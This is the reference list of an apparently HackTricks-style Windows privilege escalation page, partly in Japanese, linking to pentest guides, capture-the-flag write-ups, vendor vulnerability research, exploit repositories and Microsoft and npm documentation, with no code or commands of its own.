- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532によるSYSTEM取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP（RCE）とkernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Silver Foxを追跡：Kernel ShadowsにおけるCat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – SCADA Systemに存在するPrivileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past：WindowsにおけるSymbolic Linksの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF（Cobalt Strike BOF port）](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls：WindowsにおけるDangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules：`node_modules` foldersからのloading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json：`optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges、解答済み](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
